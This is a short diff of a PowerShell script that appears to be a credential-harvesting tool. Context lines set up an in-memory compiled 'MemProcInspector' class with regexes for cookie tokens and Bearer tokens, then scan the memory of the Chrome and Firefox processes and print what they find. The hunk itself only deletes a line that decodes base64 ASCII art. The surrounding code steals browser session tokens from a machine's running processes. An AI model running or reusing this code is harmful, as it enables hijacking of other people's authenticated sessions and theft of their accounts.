@@ -442,7 +442,6 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     [mimi.MemProcInspector]::AddRegex("cookie", "token%22%3A%22[A-Z0-9]{6,6}")
     [mimi.MemProcInspector]::AddRegex("bearer", "Bearer [A-Z0-9]{6,6}")
 
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
 $matchesFound=[mimi.MemProcInspector]::InspectManyProcs("chrome","firefox")
 
 write-output $matchesFound
